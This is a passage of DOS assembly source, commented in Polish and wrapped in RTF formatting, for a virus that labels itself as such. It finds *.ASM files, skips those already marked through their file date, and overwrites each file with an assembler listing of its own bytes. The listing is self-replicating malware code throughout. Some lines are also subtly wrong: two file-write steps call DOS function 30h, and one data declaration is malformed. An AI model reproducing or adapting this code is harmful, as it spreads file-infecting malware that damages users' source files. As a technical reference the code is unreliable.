\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc struc                             ; struktura DTA bufora transmisji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; dyskowych uzywanych przez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; funkcje 4E i 4F}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAFill db 21 dup (?)       ; nieistotna czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAAttr db ?                ; atrybut znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTATime dw ?                ; czas znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTADate dw ?                ; data znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTASize dd ?                ; dlugosc znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                DTAName db 13 (?)           ; nazwa znalezionej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTAStruc ends}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweDTA equ 80h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusStart:                                ; tu zaczyna sie kod wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,TeInformacja                  ; podaj, gdzie jest tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  Informacja                       ; spytaj o uruchomienie wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   Infekcja                         ; CF=1 oznacza nie uruchamiaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   BezInfekcji                      ; NIE - nie infekuj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekcja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,MaskaASM                      ; maska poszukiwanych plikow '*.ASM'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,Atrybut                       ; podaj atrybut poszukiwanej pozycji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Eh                           ; funkcja DOS - szukaj pierwszej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; pozycji katalogu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    BezInfekcji                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KolejnyPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   ds:[NoweDTA.DTADate],VZnacznik   ; czy znaleziony plik jest juz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zarazony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    SzukajNastepnyPlik               ; tak = szukaj nastepnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,AtrArchive                    ; podaj nowy atrybut : Archive}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,ds:[NoweDTA.DTAName]          ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,ds:[NoweDTA.DTAName]          ; podaj nazwe pliku do odczytu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3d02h                         ; funkcja DOS - otworz plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do odczytu i zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    PrzywrocAtrybut                  ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xchg  ax,bx                            ; przenies uchwyt pliku do BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,ASMNaglowek_Rozmiar           ; ile zapisac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,ASMNaglowek_Start             ; skad pobrac dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,40h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cld                                    ; operacje na lancuchach do przodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  bx                               ; zachowaj uchwyt pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   di,Bufor                         ; gdzie zapisywac wynik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   bx,Hex                           ; gdzie znajduje sie tablica}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; translacji na znaki heksalne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   si,VirusStart                    ; gdzie zaczyna sie kod}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,VirusDlug                     ; ilosc bajtow do konwersji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RobHex:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   ax,'BD'                   ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            stosw                           ;  \\ zapisz sekwencje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   ax,'0 '                   ;  / 'db 0'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            stosw                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lodsb                           ; pobierz bajt kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   ah,al                     ; zapamietaj na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            shr   al,4                      ; pobierz 4 gorne bity bajtu kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xlatb                           ; wez odpowiadajcy mu znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            stosb                           ; heksalny i zapisz go}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   al,ah                     ; wez zapamietany bajt kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            and   al,15                     ; pobierz 4 dolne bity bajtu kodu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xlatb                           ; wez odpowiadajcy mu znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            stosb                           ; heksalny i zapisz go}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; teraz bufor= 'db 0??'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   al,'h'                    ; zapisz 'h' w buforze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            stosb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; teraz bufor='db 0??h'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov   ax,0A0Dh                  ; zapisz znaki CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            stosw}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; teraz bufor='db 0??h',CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     loop RobHex                            ; przetwarzaj caly kod programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   bx                               ; przwyroc uchwyt pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub   di,offset Bufor                  ; oblicz, ile bajtow zajmuje bufor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,di                            ; ile bajtow zapisac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,Bufor                         ; podaj, skad zapisac wirusa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; jako ciag DB ?,?, ... ?,?,?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,ASMKoncowka_Rozmiar           ; ile zapisac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,ASMKoncowka_Start             ; skad pobrac dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,30h                           ; funkcja DOS - zapisz do pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jc    ZamknijPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cx,ds:[NoweDTA.DTATime]          ; przywroc czas z bufora DTA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,VZnacznik                     ; zaznacz infekcje pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5701h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZamknijPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Eh                           ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SzukajNastepnyPlik:                        ; poprzedni plik byl zarazony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,4Fh                           ; funkcja DOS - szukaj innego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; plik ASM}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jnc   KolejnyPlik                      ; gdy CF=1, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocAtrybut:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cl,ds:[NoweDTA.DTAAttr]          ; podaj stary atrybut, CH=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,ds:[NoweDTA.DTAName]          ; podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BezInfekcji:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; koncz program, skocz do PSP:100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do rozkazu Int 20h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MaskaASM   db '*.ASM'                      ; maska plikow ASM (ASCIIZ)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMNaglowek_Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        db 'V SEGMENT',CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        db 'ORG 100h',CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        db 'Start:',CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMNaglowek_Koniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMKoncowka_Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        db 'V ENDS',CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        db 'END Start',CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMKoncowka_Koniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Hex db '0123456789ABCDEF'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
